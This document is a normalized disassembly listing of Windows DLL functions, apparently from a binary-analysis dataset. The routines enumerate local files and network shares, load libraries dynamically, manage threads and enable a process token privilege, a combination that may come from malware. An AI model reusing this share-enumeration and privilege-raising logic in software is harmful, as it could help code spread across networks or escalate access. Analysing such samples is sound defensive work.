sub esp 0x4b8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx edx
mov edi ecx
mov eax [ ebp + 0x8 ]
push 0x0
push 0x0
push eax
push sub_1000d020
push 0x0
push 0x0
mov [ ebp - 0x4c0 ] edi
mov [ ebp - 0x4b8 ] 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x4a4 ] 0x0
mov esi eax
mov [ ebp - 0x4a0 ] 0x0
mov [ ebp - 0x4a0 ] 0xf
mov [ ebp - 0x4a4 ] 0x0
mov [ ebp - 0x4b4 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ ebx ] 0x0
jne r-xdata
mov ecx ebx
lea edx [ ecx + 0x1 ]
nop
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push ebx
lea ecx [ ebp - 0x4b4 ]
call sub_10005470
test esi esi
jne r-xdata
push 0x14f4
push esi
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
cmp [ rw-data ] esi
jne r-xdata
push esi
call [ CloseHandle@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4bc ]
push eax
push esi
call [ GetExitCodeThread@IAT ]
push esi
test eax eax
je r-xdata
mov esi [ rw-data ]
call [ GetLastError@IAT ]
push eax
lea eax [ ebp - 0x49c ]
push esi
push eax
call sub_1000d830
add esp 0xc
lea eax [ ebp - 0x4b4 ]
mov ecx edi
push eax
call sub_10004f60
jmp r-xdata
lea ecx [ esi + 0x20 ]
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov eax [ rw-data ]
push eax
lea eax [ ebp - 0x49c ]
push eax
call sub_1000d830
add esp 0x8
cmp [ ebp - 0x49c ] 0x0
jne r-xdata
mov ecx 0x24
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
call [ CloseHandle@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
call [ CloseHandle@IAT ]
mov esi [ ebp - 0x4bc ]
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x4b8 ] 0x1
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x4a0 ] 0x10
jb r-xdata
lea ecx [ ebp - 0x49c ]
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov eax [ rw-data ]
push eax
lea eax [ ebp - 0x49c ]
push eax
call sub_1000d830
add esp 0x8
cmp [ ebp - 0x49c ] 0x0
jne r-xdata
mov ecx 0x23
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x4a0 ] 0xf
mov [ ebp - 0x4a4 ] 0x0
mov [ ebp - 0x4b4 ] 0x0
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ ebp - 0x4b4 ]
call j_sub_1003f3e3#2
add esp 0x4
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ ebp - 0x49c ]
push eax
lea ecx [ ebp - 0x4b4 ]
call sub_10005470
lea ecx [ ebp - 0x49c ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov eax [ rw-data ]
push [ esi + 0x4 ]
mov ecx 0x22
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov eax [ rw-data ]
push [ esi ]
jmp r-xdata
mov ecx 0x21
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x4b4 ]
mov ecx edi
push eax
call sub_10004f60
push eax
lea eax [ ebp - 0x49c ]
push eax
call sub_1000d830
add esp 0xc
lea eax [ ebp - 0x49c ]
lea ecx [ ebp - 0x4b4 ]
push eax
call sub_10005430
push esi
call j_sub_1003f3e3#2
add esp 0x4
jmp r-xdata
sub_1000d370
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004d081
mov eax [ fs : 0x0 ]
push eax
sub esp 0x638
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x630 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x648 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ ebp + 0x8 ]
lea ecx [ esp + 0x68 ]
push 0x1
push eax
mov [ esp + 0x1c ] eax
call sub_100080c0
mov [ esp + 0x650 ] 0x0
cmp [ esp + 0x70 ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
mov esi [ InterlockedExchange@IAT ]
jne r-xdata
mov eax [ edi - 0x40 ]
lea ecx [ edi - 0x40 ]
mov eax [ eax + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
mov ecx [ esp + 0x6c ]
sub esp 0x18
mov esi esp
mov [ esp + 0x2c ] esp
mov [ esp + 0x28 ] eax
mov ebx edx
mov edi [ ecx ]
push esi
call [ edi + 0x14 ]
mov [ esp + 0x668 ] 0x1
push ebx
push [ esp + 0x2c ]
mov [ esp + 0x670 ] 0x0
call sub_10008410
add esp 0x20
mov edi eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x10 ] eax
jne r-xdata
mov ecx 0x25
call sub_100382c0
push eax
push rw-data
call esi
mov [ esp + 0x650 ] 0xffffffff
mov [ esp + 0x68 ] r--data
mov [ esp + 0x650 ] 0x9
cmp [ esp + 0x84 ] 0x0
jbe r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x34 ] eax
jne r-xdata
mov ecx 0x26
call sub_100382c0
push eax
push rw-data
call esi
mov [ esp + 0x650 ] 0xffffffff
cmp [ esp + 0x88 ] 0x8
jb r-xdata
cmp [ esp + 0x88 ] 0x8
lea eax [ esp + 0x74 ]
cmovae eax [ esp + 0x74 ]
push eax
call [ SetCurrentDirectoryW@IAT ]
mov eax [ rw-data ]
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x650 ] 0x2
sub esp 0x18
mov eax esp
mov [ esp + 0x30 ] esp
lea ecx [ edi - 0x40 ]
push eax
call sub_10009aa0
mov [ esp + 0x668 ] 0x3
mov [ esp + 0x668 ] 0x2
lea ecx [ esp + 0x68 ]
call sub_10007be0
add esp 0x18
mov [ esp + 0x650 ] 0x4
lea eax [ esp + 0x50 ]
cmp [ esp + 0x64 ] 0x8
cmovae eax [ esp + 0x50 ]
push eax
call [ LoadLibraryW@IAT ]
mov ebx eax
lea eax [ esp + 0xa4 ]
push ebx
push [ esp + 0x14 ]
push eax
call sub_1000d850
add esp 0xc
cmp [ esp + 0xa4 ] 0x0
jne r-xdata
mov ecx 0x27
call sub_100382c0
push eax
push rw-data
call esi
xor eax eax
mov [ esp + 0x88 ] 0x7
mov [ esp + 0x74 ] ax
mov eax edi
mov [ esp + 0x84 ] 0x0
mov ecx [ esp + 0x648 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x630 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x74 ]
call j_sub_1003f3e3#2
add esp 0x4
lea ecx [ esp + 0xa4 ]
lea edx [ ecx + 0x1 ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
push ecx
lea eax [ esp + 0xa8 ]
push eax
lea ecx [ esp + 0x40 ]
call sub_10005470
test ebx ebx
je r-xdata
sub ecx edx
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x18 ] esi
mov [ esp + 0x650 ] 0x6
test esi esi
je r-xdata
cmp [ edi - 0x14 ] 0x0
jbe r-xdata
xor esi esi
mov ecx [ edi - 0x40 ]
mov ecx [ ecx + 0x8 ]
add ecx 0xffffffc0
add ecx edi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov esi eax
jmp r-xdata
cmp [ edi - 0x10 ] 0x10
lea esi [ edi - 0x24 ]
jb r-xdata
mov [ esp + 0x650 ] 0x4
cmp [ esp + 0x30 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ esp + 0x650 ] 0x4
sub esp 0x18
mov ecx [ esp + 0x2c ]
mov eax esp
mov [ esp + 0x30 ] esp
push eax
mov edx [ ecx ]
call [ edx + 0x14 ]
mov [ esp + 0x668 ] 0x7
mov [ esp + 0x668 ] 0x4
mov ecx esi
call sub_100190c0
push 0xffffffff
push 0x0
lea eax [ esp + 0x40 ]
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x38 ] 0x0
lea ecx [ esp + 0x24 ]
push eax
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
call sub_100018b0
mov [ esp + 0x650 ] 0x8
lea ecx [ esi + 0x34 ]
lea eax [ esp + 0x1c ]
cmp ecx eax
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x1c ] 0x0
test esi esi
jne r-xdata
push [ esp + 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
lea ecx [ esp + 0xa4 ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
push eax
push ebx
call [ GetProcAddress@IAT ]
mov ebx eax
lea eax [ esp + 0xa4 ]
push ebx
push [ esp + 0x38 ]
push eax
call sub_1000d850
add esp 0xc
cmp [ esp + 0xa4 ] 0x0
jne r-xdata
mov eax [ esi ]
mov edi [ eax + 0x8 ]
add edi esi
xor edi edi
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0xa8 ]
push eax
lea ecx [ esp + 0x40 ]
call sub_10005470
test ebx ebx
je r-xdata
xor eax eax
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x50 ] ax
mov [ esp + 0x650 ] al
cmp [ esp + 0x4c ] 0x10
jb r-xdata
push [ esp + 0x50 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x650 ] 0x2
cmp [ esp + 0x64 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
push [ esp + 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
push ebx
mov edx esi
lea ecx [ esp + 0x90 ]
call sub_1000d070
add esp 0x4
mov [ esp + 0x650 ] 0x5
lea ecx [ esp + 0x38 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x650 ] 0x4
lea ecx [ esp + 0x8c ]
call sub_10001880
mov esi [ esi ]
sub_1000d870
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004d11c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x480
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x478 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x490 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x28 ]
cmp [ ebx - 0x10 ] 0x4
mov [ esp + 0x28 ] eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x7c
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x18 ] edi
mov [ esp + 0x498 ] 0x0
test edi edi
je r-xdata
mov eax [ rw-data ]
lea ecx [ ebx - 0x2c ]
push eax
mov eax [ ebx - 0x2c ]
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007eb0
mov ecx 0x2a
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
xor esi esi
mov [ esp + 0x1c ] esi
sub esp 0x18
lea ecx [ ebx - 0x2c ]
mov esi esp
mov [ esp + 0x34 ] esp
sub esp 0x18
mov eax esp
mov [ esp + 0x44 ] esp
push eax
call sub_10009aa0
mov [ esp + 0x4c8 ] 0x1
mov [ esp + 0x4c8 ] 0x0
mov ecx esi
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x4b0 ] 0x2
mov [ esp + 0x4b0 ] 0x0
mov ecx edi
call sub_10029050
mov esi eax
mov [ esp + 0x1c ] eax
jmp r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ecx + 0x24 ]
sub eax [ ecx + 0x20 ]
sar eax 0x2
cmp edx eax
jae r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x1c ]
push [ esp + 0x14 ]
mov [ esp + 0x498 ] 0xffffffff
lea eax [ esp + 0x14 ]
push eax
mov ecx esi
mov [ esp + 0x18 ] 0x0
call sub_10029650
test eax eax
jne r-xdata
xor ecx ecx
mov eax [ ecx + 0x20 ]
mov ecx [ eax + edx * 4 ]
jmp r-xdata
mov ecx [ esp + 0x490 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x478 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
call [ GetLastError@IAT ]
mov edx [ esi ]
mov ecx esi
mov [ esp + 0x18 ] eax
call [ edx + 0x1c ]
test edi edi
je r-xdata
mov edx [ edi ]
mov ecx edi
call [ edx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov [ esp + 0x14 ] ecx
call [ eax + 0x4 ]
mov edi eax
mov [ esp + 0x18 ] edi
test edi edi
je r-xdata
push [ esp + 0x18 ]
jmp r-xdata
mov edx [ edi ]
mov ecx edi
push 0x1
call [ edx ]
push 0x10
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x20 ] edi
mov [ esp + 0x498 ] 0x3
test edi edi
je r-xdata
mov eax [ ebx - 0x2c ]
lea ecx [ ebx - 0x2c ]
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
jmp r-xdata
xor edi edi
mov [ edi ] r--data
mov [ esp + 0x498 ] 0x4
mov eax [ esp + 0x18 ]
mov [ edi ] r--data
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] eax
mov [ esp + 0x498 ] 0x3
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x28 ]
mov [ esp + 0x24 ] eax
lea eax [ esp + 0x20 ]
push eax
mov [ esp + 0x24 ] edi
lea ecx [ ecx + 0x30 ]
call sub_10039440
mov ecx 0x28
call sub_10038420
push eax
lea ecx [ esp + 0x48 ]
call sub_10001820
mov [ esp + 0x498 ] 0x5
mov ecx 0x29
call sub_10038420
mov edi [ esp + 0x1c ]
mov esi eax
lea eax [ esp + 0x2c ]
mov ecx edi
push eax
mov edx [ edi ]
call [ edx + 0x8 ]
mov [ esp + 0x498 ] 0x6
lea ecx [ esp + 0x2c ]
cmp [ esp + 0x40 ] 0x10
mov eax [ edi ]
cmovae ecx [ esp + 0x2c ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
push eax
lea eax [ esp + 0x64 ]
push esi
push eax
call sub_1000dc00
add esp 0x10
lea eax [ esp + 0x5c ]
lea ecx [ esp + 0x44 ]
push eax
call sub_10005430
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x20 ] esi
mov [ esp + 0x498 ] 0x7
test esi esi
je r-xdata
call [ GetLastError@IAT ]
mov edx [ edi ]
mov ecx edi
mov esi eax
call [ edx + 0x4 ]
push esi
jmp r-xdata
mov [ esp + 0x498 ] 0xffffffff
mov ecx edi
call sub_1002b470
test eax eax
jne r-xdata
xor esi esi
mov ecx [ ebx - 0x2c ]
mov ecx [ ecx + 0x8 ]
add ecx 0xffffffd4
add ecx ebx
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov edi [ eax + 0x8 ]
add edi esi
xor edi edi
jmp r-xdata
mov [ esp + 0x498 ] 0x6
sub esp 0x18
lea eax [ esp + 0x5c ]
mov [ esp + 0x38 ] esp
mov ecx esp
push eax
call sub_10003600
mov [ esp + 0x4b0 ] 0x8
mov [ esp + 0x4b0 ] 0x6
mov ecx esi
call sub_1000a260
test esi esi
jne r-xdata
mov [ esp + 0x498 ] 0x5
lea ecx [ esp + 0x2c ]
call sub_10001880
mov [ esp + 0x498 ] 0xffffffff
lea ecx [ esp + 0x44 ]
call sub_10001880
mov eax edi
jmp r-xdata
sub_1000dc20
push ebp
mov ebp esp
push 0xffffffff
push sub_1004d16b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
mov [ esi + 0x1c ] 0x0
mov [ esi + 0x20 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x8 ] ax
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1000dce0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004d1a3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push eax
call [ FindClose@IAT ]
mov [ esi + 0x1c ] 0x0
mov [ esi + 0x18 ] 0x7
xor eax eax
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] ax
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x4 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1000dd90
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x258
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x254 ] eax
push esi
mov esi ecx
push edi
mov edi [ ebp + 0x8 ]
mov eax [ esi + 0x1c ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x8 ]
push ecx
push eax
call [ FindNextFileW@IAT ]
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x8
lea eax [ esi + 0x4 ]
jb r-xdata
xor eax eax
pop edi
pop esi
mov ecx [ esp + 0x254 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
lea eax [ esp + 0x34 ]
push eax
push 0x104
push edi
call sub_1003d249
mov eax [ esp + 0x14 ]
add esp 0xc
mov ecx [ esp + 0x10 ]
mov [ edi + 0x208 ] eax
mov eax [ esp + 0xc ]
mov [ edi + 0x214 ] ecx
mov ecx [ esp + 0x20 ]
mov [ edi + 0x210 ] eax
mov eax [ esp + 0x1c ]
mov [ edi + 0x21c ] ecx
mov ecx [ esp + 0x24 ]
mov [ edi + 0x218 ] eax
mov eax [ esp + 0x28 ]
mov [ edi + 0x224 ] ecx
mov ecx [ esp + 0x25c ]
mov [ edi + 0x220 ] eax
mov eax 0x1
pop edi
pop esi
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
lea ecx [ esp + 0x8 ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
mov [ esi + 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ eax ]
mov [ esi + 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ esi + 0x20 ] eax
sub_1000de90
push ebp
mov ebp esp
push 0xffffffff
push sub_1004d1a3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push eax
call [ FindClose@IAT ]
mov [ esi + 0x1c ] 0x0
mov [ esi + 0x18 ] 0x7
xor eax eax
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] ax
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
push [ esi + 0x4 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1000df40
push ebp
mov ebp esp
push 0xffffffff
push sub_1004d1ee
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x3
lea edi [ esi + 0x1c ]
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] eax
mov [ edi ] ax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
lea eax [ ebp + 0x20 ]
cmp edi eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x38 ] 0x0
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x40 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx edi
call sub_10003a20
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x34 ] 0x8
jb r-xdata
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp + 0x34 ] 0x7
mov [ ebp + 0x20 ] ax
mov eax esi
mov [ ebp + 0x30 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x30
push [ ebp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1000e060
push ebp
mov ebp esp
push 0xffffffff
push sub_1004d22e
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ esi + 0x30 ] 0x8
jb r-xdata
push eax
call [ NetApiBufferFree@IAT ]
xor eax eax
mov [ esi + 0x30 ] 0x7
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x1c ] ax
mov [ ebp - 0x4 ] al
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push [ esi + 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x18 ] 0x7
xor eax eax
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] ax
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x4 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1000e130
push ebp
mov ebp esp
sub esp 0x21c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp [ esi + 0x34 ] 0x0
push edi
lea edi [ esi + 0x34 ]
jne r-xdata
mov eax [ esi + 0x3c ]
cmp eax [ esi + 0x38 ]
jae r-xdata
cmp [ esi + 0x18 ] 0x8
lea eax [ esi + 0x4 ]
jb r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
mov edi edi
push eax
lea eax [ ebp - 0x20c ]
push 0x104
push eax
call sub_1003d249
add esp 0xc
lea eax [ ebp - 0x21c ]
push 0x0
push eax
lea eax [ esi + 0x38 ]
push eax
push 0xffffffff
push edi
push 0x1
lea eax [ ebp - 0x20c ]
push eax
call [ NetShareEnum@IAT ]
test eax eax
je r-xdata
mov eax [ eax ]
lea eax [ esi + 0x1c ]
mov eax [ esi + 0x1c ]
jmp r-xdata
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x40 ] eax
push [ ebp - 0x218 ]
push 0x104
push ebx
call sub_1003d249
add esp 0xc
mov [ ebx + 0x220 ] 0x0
cmp [ ebp - 0x214 ] 0x0
mov ecx 0x10010
mov eax 0x40
mov [ ebx + 0x224 ] 0x0
cmove eax ecx
mov [ ebx + 0x210 ] 0x0
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0x208 ] eax
xor ecx ebp
pop esi
mov [ ebx + 0x214 ] 0x0
mov eax 0x1
mov [ ebx + 0x218 ] 0x0
mov [ ebx + 0x21c ] 0x0
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x3c ]
cmp eax [ esi + 0x38 ]
jb r-xdata
push eax
push [ ebp - 0x218 ]
call [ PathMatchSpecW@IAT ]
test eax eax
jne r-xdata
mov edx [ esi + 0x3c ]
mov eax [ esi + 0x34 ]
lea ecx [ edx + edx * 2 ]
movq xmm0 [ eax + ecx * 4 ]
mov eax [ eax + ecx * 4 + 0x8 ]
mov [ ebp - 0x210 ] eax
lea eax [ edx + 0x1 ]
mov [ esi + 0x3c ] eax
cmp [ esi + 0x30 ] 0x8
movq [ ebp - 0x218 ] xmm0
jb r-xdata
jmp r-xdata
sub_1000e2a0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000e060
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1000e2d0
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x18 ]
xor esi esi
push eax
push 0x20
mov [ ebp - 0x18 ] esi
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
cmp [ rw-data ] esi
jne r-xdata
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
lea ecx [ ebp - 0x20 ]
push ecx
push eax
push 0x0
call [ LookupPrivilegeValueW@IAT ]
test eax eax
je r-xdata
mov ecx 0xb
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
call [ GetLastError@IAT ]
mov eax [ ebp - 0x20 ]
push 0x0
push 0x0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x1c ]
push 0x10
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push [ ebp - 0x18 ]
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x8 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
mov esi 0x1
jmp r-xdata
push [ ebp - 0x18 ]
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_1003c623
mov esp ebp
pop ebp
retn
sub_1000e3a0
push ebp
mov ebp esp
and esp 0xfffffff8
